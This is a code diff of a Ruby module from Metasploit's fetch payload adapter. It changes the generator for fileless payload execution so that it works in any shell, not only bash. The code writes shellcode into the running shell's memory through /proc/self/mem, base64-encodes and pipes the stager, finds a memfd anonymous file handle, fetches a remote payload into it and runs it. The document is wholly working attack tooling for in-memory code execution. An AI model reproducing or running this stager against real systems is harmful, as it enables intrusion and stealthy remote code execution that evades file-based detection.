@@ -187,7 +187,7 @@ module Msf::Payload::Adapter::Fetch::Fileless
     return payload
   end
 
-  def _generate_jmp_instruction_bash(arch)
+  def _generate_jmp_instruction(arch)
     #
     # The sed command will basically take two characters at the time and switch their order, this is due to endianess of x86 addresses
     
@@ -271,40 +271,40 @@ module Msf::Payload::Adapter::Fetch::Fileless
     end
   end
 
-  # Original Idea: The idea behind fileless execution are anonymous files. The bash script will search through all processes owned by $USER and search from all file descriptor. If it will find anonymous file (contains "memfd") with correct permissions (rwx), it will copy the payload into that descriptor with defined fetch command and finally call that descriptor
-  # New idea: use /proc/*/mem to write shellcode stager into bash process and create anonymous handle on-fly, then search for that handle and use same approach as original idea
-  def _generate_fileless_bash(get_file_cmd, arch)
-    stage_cmd = %<vdso_addr=$((0x$(grep -F "[vdso]" /proc/$$/maps | cut -d'-' -f1)));>
-    stage_cmd << %(jmp=#{_generate_jmp_instruction_bash(arch)};)
-    stage_cmd << %(sc='#{_generate_first_stage_shellcode(arch).unpack("H*")[0]}';)
-    stage_cmd << %<jmp=$(printf $jmp | sed 's/\\([0-9A-F]\\{2\\}\\)/\\\\x\\1/gI');>
-    stage_cmd << %<sc=$(printf $sc | sed 's/\\([0-9A-F]\\{2\\}\\)/\\\\x\\1/gI');>
-    stage_cmd << 'read syscall_info < /proc/self/syscall;'
-    stage_cmd << "addr=$(($(echo $syscall_info | cut -d' ' -f9)));"
-    stage_cmd << 'exec 3>/proc/self/mem;'
-    stage_cmd << 'dd bs=1 skip=$vdso_addr <&3 >/dev/null 2>&1;'
-    stage_cmd << 'printf $sc >&3;'
-    stage_cmd << 'exec 3>&-;'
-    stage_cmd << 'exec 3>/proc/self/mem;'
-    stage_cmd << 'dd bs=1 skip=$addr <&3 >/dev/null 2>&1;'
-    stage_cmd << 'printf $jmp >&3;'
+# Original Idea: The idea behind fileless execution are anonymous files. The bash script will search through all processes owned by $USER and search from all file descriptor. If it will find anonymous file (contains "memfd") with correct permissions (rwx), it will copy the payload into that descriptor with defined fetch command and finally call that descriptor
+# New idea: use /proc/*/mem to write shellcode stager into bash process and create anonymous handle on-fly, then search for that handle and use same approach as original idea
+def _generate_fileless_shell(get_file_cmd, arch)
+  stage_cmd = %<writebytes () { printf \\\\%03o "$@" ; };>
+  stage_cmd << %<vdso_addr=$((0x$(grep -F "[vdso]" /proc/$$/maps | cut -d'-' -f1)));>
+  stage_cmd << %(jmp=#{_generate_jmp_instruction(arch)};)
+  stage_cmd << %(sc='#{_generate_first_stage_shellcode(arch).unpack("H*")[0]}';)
+  stage_cmd << 'read syscall_info < /proc/self/syscall;'
+  stage_cmd << "addr=$(($(echo $syscall_info | cut -d' ' -f9)));"
+  stage_cmd << 'exec 3>/proc/self/mem;'
+  stage_cmd << 'dd bs=1 skip=$vdso_addr <&3 >/dev/null 2>&1;'
+  stage_cmd << %(printf "$(writebytes `printf $sc | awk '{gsub(/.{2}/,"0x& ")}1'`)" >&3;)
+  stage_cmd << 'exec 3>&-;'
+  stage_cmd << 'exec 3>/proc/self/mem;'
+  stage_cmd << 'dd bs=1 skip=$addr <&3 >/dev/null 2>&1;'
+  stage_cmd << %(printf "$(writebytes `printf $jmp | awk '{gsub(/.{2}/,"0x& ")}1'`)" >&3;)
 
-    cmd = "echo -n '#{Base64.strict_encode64(stage_cmd).gsub(/\n/, '')}' | base64 -d | bash & "
-    cmd << 'cd /proc/$!;'
-    cmd << 'og_process=$!;'
-    cmd << 'sleep 2;' #adding short pause to give process time to load file handle
-    cmd << 'FOUND=0;if [ $FOUND -eq 0 ];'
+  cmd = "echo -n '#{Base64.strict_encode64(stage_cmd).gsub(/\n/, '')}' | base64 -d | $0 & "
+  cmd << 'cd /proc/$!;'
+  cmd << 'og_process=$!;'
+  cmd << 'sleep 2;' #adding short pause to give process time to load file handle
+  cmd << 'FOUND=0;if [ $FOUND -eq 0 ];'
 
-    cmd << 'then for f in $(find ./fd -type l -perm u=rwx 2>/dev/null);'
-    cmd << 'do if [ $(ls -al $f | grep -o "memfd" >/dev/null; echo $?) -eq "0" ];'
-    cmd << "then if $(#{get_file_cmd} >/dev/null);"
-    cmd << 'then $f&;FOUND=1;break;'
-    cmd << 'fi;'
-    cmd << 'fi;'
-    cmd << 'done;'
-    cmd << 'fi;'
-    cmd << 'kill -9 $og_process;'
-  end
+  cmd << 'then for f in $(find ./fd -type l -perm u=rwx 2>/dev/null);'
+  cmd << 'do if [ $(ls -al $f | grep -o "memfd" >/dev/null; echo $?) -eq "0" ];'
+  cmd << "then if $(#{get_file_cmd} >/dev/null);"
+  cmd << 'then $f & FOUND=1;break;'
+  cmd << 'fi;'
+  cmd << 'fi;'
+  cmd << 'done;'
+  cmd << 'fi;'
+  cmd << 'sleep 2;' #adding short pause to give process time to load file handle
+  cmd << 'kill -9 $og_process;'
+end
   
   # same idea as _generate_fileless function, but force creating anonymous file handle
   def _generate_fileless_python(get_file_cmd)
